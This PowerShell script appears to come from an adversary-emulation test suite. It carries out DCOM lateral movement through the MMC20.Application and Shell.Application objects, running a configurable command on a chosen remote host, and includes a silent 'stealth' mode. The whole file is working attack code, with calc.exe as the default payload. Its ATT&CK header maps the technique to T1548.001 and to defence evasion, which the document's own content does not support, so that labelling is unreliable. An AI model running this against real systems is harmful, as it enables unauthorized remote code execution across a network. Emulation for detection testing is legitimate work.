# T1548.001G - DCOM Lateral Movement
# MITRE ATT&CK Technique: T1548.001 - Abuse Elevation Control Mechanism: DCOM
# Platform: Windows | Privilege: User | Tactic: Defense Evasion

#Requires -Version 5.0

# Function 1: Get-Configuration (40-50 lines max)
function Get-Configuration {
    param()
    
    $config = @{
        Success = $false
        Technique = "T1548.001G"
        TechniqueName = "DCOM Lateral Movement"
        OutputBase = $env:OUTPUT_BASE
        Timeout = if ($env:TIMEOUT) { [int]$env:TIMEOUT } else { 300 }
        Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        Results = @{
            InitialPrivilege = ""
            TargetHost = ""
            DcomObject = ""
            CommandExecuted = ""
            ExecutionSuccess = $false
            ErrorMessage = ""
        }
    }
    
    # Load technique-specific variables
    $Config.TargetHost = if ($env:T1548_001G_TARGET_HOST) { $env:T1548_001G_TARGET_HOST } else { "localhost" }
    $Config.DcomObject = if ($env:T1548_001G_DCOM_OBJECT) { $env:T1548_001G_DCOM_OBJECT } else { "MMC20.Application" }
    $Config.TargetCommand = if ($env:T1548_001G_TARGET_COMMAND) { $env:T1548_001G_TARGET_COMMAND } else { "calc.exe" }
    $Config.OutputMode = if ($env:T1548_001G_OUTPUT_MODE) { $env:T1548_001G_OUTPUT_MODE } else { "simple" }
    $Config.SilentMode = if ($env:T1548_001G_SILENT_MODE -eq "true") { $true } else { $false }
    
    # Validate DCOM availability
    $dcomEnabled = Get-ItemProperty "HKLM:\Software\Microsoft\Ole" -Name "EnableDCOM" -ErrorAction SilentlyContinue
    if ($dcomEnabled.EnableDCOM -ne "Y") {
        $Config.Results.ErrorMessage = "DCOM is not enabled"
        return $config
    }
    
    # Test connectivity for remote targets
    if ($Config.TargetHost -ne "localhost" -and $Config.TargetHost -ne "127.0.0.1") {
        if (-not (Test-Connection -ComputerName $Config.TargetHost -Count 1 -Quiet)) {
            $Config.Results.ErrorMessage = "Cannot reach target host: $($Config.TargetHost)"
            return $config
        }
    }
    
    $Config.Success = $true
    return $config
}

# Specialized function: Execute via DCOM MMC20
function Invoke-DcomMmc20Execution {
    param($TargetHost, $TargetCommand)
    
    try {
        if ($TargetHost -eq "localhost" -or $TargetHost -eq "127.0.0.1") {
            $dcom = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application"))
        } else {
            $dcom = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", $TargetHost))
        }
        
        $dcom.Document.ActiveView.ExecuteShellCommand(
            $TargetCommand,
            $null,
            $null,
            "7"  # Minimized window
        )
        
        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($dcom) | Out-Null
        return $true
    }
    catch {
        return $false
    }
}

# Specialized function: Execute via DCOM ShellWindows
function Invoke-DcomShellWindowsExecution {
    param($TargetHost, $TargetCommand)
    
    try {
        if ($TargetHost -eq "localhost" -or $TargetHost -eq "127.0.0.1") {
            $dcom = [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
        } else {
            $dcom = [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", $TargetHost))
        }
        
        $dcom.ShellExecute($TargetCommand)
        
        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($dcom) | Out-Null
        return $true
    }
    catch {
        return $false
    }
}

# Function 2: Invoke-MicroTechniqueAction (30-40 lines max)
function Invoke-MicroTechniqueAction {
    param($Config)
    
    # Get initial privilege level
    $currentPrincipal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $Config.Results.InitialPrivilege = if ($isAdmin) { "Administrator" } else { "User" }
    
    if (-not $Config.SilentMode) {
        Write-Host "[INFO] Starting DCOM execution..." -ForegroundColor Yellow
    }
    
    # ATOMIC ACTION: DCOM remote execution
    $Config.Results.TargetHost = $Config.TargetHost
    $Config.Results.DcomObject = $Config.DcomObject
    $Config.Results.CommandExecuted = $Config.TargetCommand
    
    # Execute via DCOM based on object type
    if ($Config.DcomObject -eq "MMC20.Application") {
        $executionSuccess = Invoke-DcomMmc20Execution -TargetHost $Config.TargetHost `
                                                      -TargetCommand $Config.TargetCommand
    } else {
        $executionSuccess = Invoke-DcomShellWindowsExecution -TargetHost $Config.TargetHost `
                                                            -TargetCommand $Config.TargetCommand
    }
    
    if (-not $executionSuccess) {
        $Config.Results.ErrorMessage = "Failed to execute via DCOM"
        return $Config
    }
    
    $Config.Results.ExecutionSuccess = $true
    
    if (-not $Config.SilentMode) {
        Write-Host "[SUCCESS] DCOM execution completed" -ForegroundColor Green
    }
    
    return $Config
}

# Function 3: Write-StandardizedOutput (30-40 lines max)
function Write-StandardizedOutput {
    param($Config)
    
    $outputDir = Join-Path $Config.OutputBase "T1548.001g_dcom_movement_$($Config.Timestamp)"
    
    switch ($Config.OutputMode) {
        "simple" {
            # Realistic attacker output
            if ($Config.Results.ExecutionSuccess) {
                Write-Host "`n[+] DCOM Execution Successful" -ForegroundColor Green
                Write-Host "    Initial Privilege: $($Config.Results.InitialPrivilege)"
                Write-Host "    Target Host: $($Config.Results.TargetHost)"
                Write-Host "    DCOM Object: $($Config.Results.DcomObject)"
                Write-Host "    Command: $($Config.Results.CommandExecuted)"
            } else {
                Write-Host "`n[-] DCOM Execution Failed: $($Config.Results.ErrorMessage)" -ForegroundColor Red
            }
        }
        
        "debug" {
            # Structured JSON for analysis
            $null = New-Item -ItemType Directory -Path $outputDir -Force
            $debugOutput = @{
                Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                Technique = $Config.Technique
                TechniqueName = $Config.TechniqueName
                Platform = "Windows"
                ExecutionResults = $Config.Results
                EnvironmentContext = @{
                    Hostname = $env:COMPUTERNAME
                    Username = $env:USERNAME
                    OSVersion = [System.Environment]::OSVersion.VersionString
                }
            }
            $debugOutput | ConvertTo-Json -Depth 4 | Out-File "$outputDir\t1548_001g_dcom_lateral_movement.json"
            Write-Host "[DEBUG] Results saved to: $outputDir" -ForegroundColor Cyan
        }
        
        "stealth" {
            # Silent operation - no output
        }
    }
}

# Function 4: Main (20-30 lines max)
function Main {
    # Exit codes: 0=SUCCESS, 1=FAILED, 2=SKIPPED
    
    # Step 1: Get configuration
    $Config = Get-Configuration
    if (-not $Config.Success) {
        if ($Config.Results.ErrorMessage -like "*DCOM is not enabled*") {
            Write-Host "[SKIP] $($Config.Results.ErrorMessage)" -ForegroundColor Yellow
            exit 2
        }
        Write-Host "[ERROR] $($Config.Results.ErrorMessage)" -ForegroundColor Red
        exit 1
    }
    
    # Step 2: Execute micro-technique
    $config = Invoke-MicroTechniqueAction -Config $config
    
    # Step 3: Write output
    Write-StandardizedOutput -Config $config
    
    # Return appropriate exit code
    if ($Config.Results.ExecutionSuccess) {
        exit 0
    } else {
        exit 1
    }
}

# Execute main function
Main

